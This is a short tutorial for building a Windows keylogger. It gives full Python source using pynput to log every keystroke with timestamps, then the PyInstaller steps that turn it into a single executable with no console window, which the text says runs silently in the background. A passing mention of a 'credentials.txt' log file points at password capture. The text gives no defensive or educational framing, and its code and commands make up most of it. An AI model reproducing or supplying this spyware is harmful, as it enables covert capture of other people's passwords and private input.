# Keylogger
Step 1: Environment Setup
Install Libraries: Use pip to install the necessary packages:
     pip install pynput
Required for package installation.
1.   pip install pyinstaller

Step 2: Keylogger Script Creation:
Create a file named keylogger.pyw and add the following Python code:
from pynput.keyboard import Key, Listener
import logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special Key {key} pressed")
with Listener(on_press=on_press) as listener:
    listener.join()

Step 3: Convert Script to Executable
1. Virtual Environment (Recommended):
○ Navigate to the project directory in the terminal.
Create and activate a virtual environment:
python -m venv keyenv
○ .\keyenv\Scripts\activate  # For PowerShell
2. Generate Executable: Use PyInstaller with the following flags to create a
single, non-console executable:
pyinstaller --noconsole --onefile keylogger.pyw
○--noconsole: Prevents the terminal window from appearing.
○--onefile: Packages the script into a single .exe file.
3. Check Output: The standalone keylogger.exe file will be located inside the dist folder.

Step 4: Test and Verification
1. Run Executable: Navigate to the dist folder and double-click 
keylogger.exe. It will run silently in the background.
2. Verify Logging: Type arbitrary keys on the keyboard.
3. Check Log File: Open the keylog.txt file (or credentials.txt as mentioned in the original steps) to confirm that the keystrokes, along with timestamps, have been successfully logged.

Step 5: Stopping the Keylogger
The keylogger runs in the background and must be manually terminated:
1. Using Task Manager (Windows):
○ Press Ctrl + Shift + Esc to open Task Manager.
○ In the Processes tab, locate the keylogger.exe process.
○ Right-click and select End Task to stop the program.
2. Using Command Line:
○ Open Command Prompt (Win + R, type cmd, Enter).
○ Execute the following command to forcibly terminate the process:
taskkill /f /im keylogger.exe
